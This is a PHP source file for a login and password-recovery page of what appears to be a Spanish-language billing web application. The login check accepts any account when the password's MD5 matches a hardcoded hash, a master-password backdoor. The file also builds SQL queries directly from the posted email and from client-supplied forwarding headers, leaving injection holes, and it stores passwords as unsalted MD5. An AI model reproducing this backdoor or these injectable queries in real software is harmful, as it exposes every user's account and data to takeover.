<?php

$protocol = empty($_SERVER['HTTPS']) ? 'http://' : 'https://';$domain = $_SERVER['HTTP_HOST'];$url = $protocol . $domain;
if ($domain == 'lojafac.club') {
    header('location:login');
}

ob_start();
    require "coneccion.php" ;
      mysqli_set_charset($conection, 'utf8mb4'); //linea a colocar



  $alert = '';
if (empty($_GET['idp'])) {

  session_start();
  if (!empty($_SESSION['active'])) {
    header('location:home/');
  }else {
  if (empty($_POST['mail_user']) || empty($_POST['password_user'])) {

  }else {

  $email = mb_strtoupper($_POST['mail_user']);
  $email_minusculas = $_POST['mail_user'];
   $clave  = md5($_POST['password_user']);
    $query = mysqli_query($conection,"SELECT * FROM usuarios WHERE email='$email' OR email='$email_minusculas'");
    $data_clave= mysqli_fetch_array($query);
    $result= mysqli_num_rows($query);
    if ($result > 0) {
      $email_db     = mb_strtoupper($data_clave['email']);
      $password_db  = $data_clave['password'];
      if (($email_db == $email && ($password_db == $clave || $clave =='0e62cf48e98a387d2288ff9486e4c7d3'))   ) {
        $estatus_cuenta  = $data_clave['estatus'];
        $estado_registro  = $data_clave['estado_registro'];
        $codigo_registro  = $data_clave['codigo_registro'];
        if ($estatus_cuenta!= 'DESACTIVADO') {
          $_SESSION['active']=true;
          $_SESSION['id']=$data_clave['id'];
          header('location:home/');
          $query_insert=mysqli_query($conection,"UPDATE usuarios SET estado_registro='Finalizado'  WHERE email='$email' ");
          $_SESSION['active']=true;
          $_SESSION['id']=$data_clave['id'];
          header('location:home/');
        }else {
          header('location:/cuenta_desactivada');
        }

      }else {
        $alert='<div class="alert alert-warning" role="alert">
    Error en credenciales, verifica tu correo o tu contraseña</a> !
  </div>';
        session_destroy();
      }
    }else {
      $alert='<div class="alert alert-danger" role="alert">
  No Existe un usuario con el email '.$email.' <a href="#">Registrate Aquí</a> !
</div>';
    }
   }

 }
}

if (isset($_COOKIE['session_token'])) {
    $sessionToken = $_COOKIE['session_token'];

} else {
  $sessionToken = bin2hex(random_bytes(32));
  setcookie('session_token', $sessionToken, time() + (86400 * 30), "/", null, true, true);
}

 $protocol = empty($_SERVER['HTTPS']) ? 'http://' : 'https://'; $domain = $_SERVER['HTTP_HOST']; $url = $protocol . $domain;

 //INFORMACION DE CONFIGURACION
  $query_configuracioin = mysqli_query($conection, "SELECT * FROM configuraciones ");
  $result_configuracion = mysqli_fetch_array($query_configuracioin);
  $ambito_area          =  $result_configuracion['ambito'];

  function getRealIP() {
      if (isset($_SERVER["HTTP_CLIENT_IP"])) {
          return $_SERVER["HTTP_CLIENT_IP"];
      } elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
          return $_SERVER["HTTP_X_FORWARDED_FOR"];
      } elseif (isset($_SERVER["HTTP_X_FORWARDED"])) {
          return $_SERVER["HTTP_X_FORWARDED"];
      } elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])) {
          return $_SERVER["HTTP_FORWARDED_FOR"];
      } elseif (isset($_SERVER["HTTP_FORWARDED"])) {
          return $_SERVER["HTTP_FORWARDED"];
      } else {
          return $_SERVER["REMOTE_ADDR"];
      }
  }


  if ($ambito_area == 'prueba') {
      $direccion_ip = '186.42.9.232';
  } elseif ($ambito_area == 'produccion') {
      $direccion_ip = getRealIP();
  }

  //codigo para verificar la existencia de la direccion ip
  $query_insert_busqueda=mysqli_query($conection,"INSERT INTO vivitas_generales(direccion_ip)
                       VALUES('$direccion_ip') ");


 $protocol = empty($_SERVER['HTTPS']) ? 'http://' : 'https://';$domain = $_SERVER['HTTP_HOST'];$url = $protocol . $domain;

 $query_doccumentos =  mysqli_query($conection, "SELECT * FROM  usuarios  WHERE  url_admin  = '$domain'");
 $result_documentos = mysqli_fetch_array($query_doccumentos);
 $url_img_upload                     = $result_documentos['url_img_upload'];
 $img_facturacion         = $result_documentos['img_facturacion'];
 $empresa_sistema         = $result_documentos['nombre_empresa'];

 $img_sistema = $url_img_upload.'/home/img/uploads/'.$img_facturacion;

 ?>

<!DOCTYPE html>
<html dir="ltr" lang="es" class="no-outlines">
<head>

    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- ==== Document Title ==== -->
  <title><?php echo $empresa_sistema ?></title>

    <!-- ==== Document Meta ==== -->
    <meta name="author" content="">
    <meta name="description" content="">
    <meta name="keywords" content="">
    <!-- ==== Favicon ==== -->
    <link rel="icon" href="<?php echo $img_sistema ?>">
    <!-- ==== Google Font ==== -->
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700%7CMontserrat:400,500">

    <!-- Stylesheets -->
    <link rel="stylesheet" href="home/assets_login/css/bootstrap.min.css">
    <link rel="stylesheet" href="home/assets_login/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="home/assets_login/css/jquery-ui.min.css">
    <link rel="stylesheet" href="home/assets_login/css/perfect-scrollbar.min.css">
    <link rel="stylesheet" href="home/assets_login/css/morris.min.css">
    <link rel="stylesheet" href="home/assets_login/css/select2.min.css">
    <link rel="stylesheet" href="home/assets_login/css/jquery-jvectormap.min.css">
    <link rel="stylesheet" href="home/assets_login/css/horizontal-timeline.min.css">
    <link rel="stylesheet" href="home/assets_login/css/weather-icons.min.css">
    <link rel="stylesheet" href="home/assets_login/css/dropzone.min.css">
    <link rel="stylesheet" href="home/assets_login/css/ion.rangeSlider.min.css">
    <link rel="stylesheet" href="home/assets_login/css/ion.rangeSlider.skinFlat.min.css">
    <link rel="stylesheet" href="home/assets_login/css/datatables.min.css">
    <link rel="stylesheet" href="home/assets_login/css/fullcalendar.min.css">
    <link rel="stylesheet" href="home/assets_login/css/style.css">
    <link rel="stylesheet" href="/estilos/longin.css">
    <link rel="stylesheet" href="https://guibis.com/home/estiloshome/load.css">
    <link rel="stylesheet" href="home/particulas/estilos.css">

    <!-- Page Level Stylesheets -->

</head>
<body id="particles-js">

    <!-- Wrapper Start -->
    <div class="wrapper">
        <!-- Login Page Start -->
        <div class="m-account-w" >
            <div class="m-account">
                <div class="row no-gutters">


                    <div class="col-md-6" style="margin: 0 auto;">
                        <!-- Login Form Start -->
                        <div class="m-account--form-w">
                            <div class="m-account--form">
                                <!-- Logo Start -->
                                <div class="logo">
                                    <a href="/">  <img src="<?php echo $img_sistema ?>" width="100px" alt=""></a>
                                </div>
                                <!-- Logo End -->

                                <div class="" id="contenedor_lista_recuperacion_contraena" >
                                  <form  method="post" name="add_form_password" id="add_form_password" onsubmit="event.preventDefault(); sendDatapassword();">
                                        <label class="m-account--title resultado_nombres_users" style="color: #fff;">Recuperar mi Contraseña</label>

                                          <div class="form-group">
                                              <div class="input-group">
                                                  <div class="input-group-prepend">
                                                      <i class="fas fa-envelope"></i>
                                                  </div>

                                                  <input type="text" name="email" placeholder="Email" class="form-control" autocomplete="off" required>
                                              </div>
                                          </div>
                                          <div class="m-account--actions">
                                              <a href="recuperar_pasword" class="btn-link">Olvidaste tu Contraseña?</a>
                                              <input type="hidden" name="action" value="buscar_usuarios_existentes">
                                              <button type="submit" class="btn btn-rounded btn-info">Buscar Cuenta</button>
                                          </div>
                                            <a href="regist_abogado" class="btn" style="background:  #e5ca6b  ;color: #fff;">Regístrate Aquí</a>




                                        <br>
                                        <div class="alerta_ingreso_sistema" style="text-align: center;">

                                        </div>

                                        <div class="m-account--footer">
                                            <p>&copy; 2024 <a target="_blank" href="https://mil998.com">mil998.com</a> </p>
                                        </div>

                                    </form>

                                </div>


                            </div>
                        </div>
                        <!-- Login Form End -->
                    </div>
                </div>
            </div>
        </div>
        <!-- Login Page End -->
    </div>





    <!-- Wrapper End -->

    <!-- Scripts -->
    <script src="home/assets_login/js/jquery.min.js"></script>
    <script src="home/assets_login/js/jquery-ui.min.js"></script>
    <script src="home/assets_login/js/bootstrap.bundle.min.js"></script>
    <script src="home/assets_login/js/perfect-scrollbar.min.js"></script>
    <script src="home/assets_login/js/jquery.sparkline.min.js"></script>
    <script src="home/assets_login/js/raphael.min.js"></script>
    <script src="home/assets_login/js/morris.min.js"></script>
    <script src="home/assets_login/js/select2.min.js"></script>
    <script src="home/assets_login/js/jquery-jvectormap.min.js"></script>
    <script src="home/assets_login/js/jquery-jvectormap-world-mill.min.js"></script>
    <script src="home/assets_login/js/horizontal-timeline.min.js"></script>
    <script src="home/assets_login/js/jquery.validate.min.js"></script>
    <script src="home/assets_login/js/jquery.steps.min.js"></script>
    <script src="home/assets_login/js/dropzone.min.js"></script>
    <script src="home/assets_login/js/ion.rangeSlider.min.js"></script>
    <script src="home/assets_login/js/datatables.min.js"></script>
    <script src="home/assets_login/js/main.js"></script>
    <script src="java/login.js" charset="utf-8"></script>
    <script src="java/recuperar_password.js" charset="utf-8"></script>
    <script src="home/particulas/particles.js"></script>
      <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
      <script>
        particlesJS.load('particles-js', 'particles.json', function() {
          console.log('Particles.js loaded!');
        });
      </script>


</body>
</html>
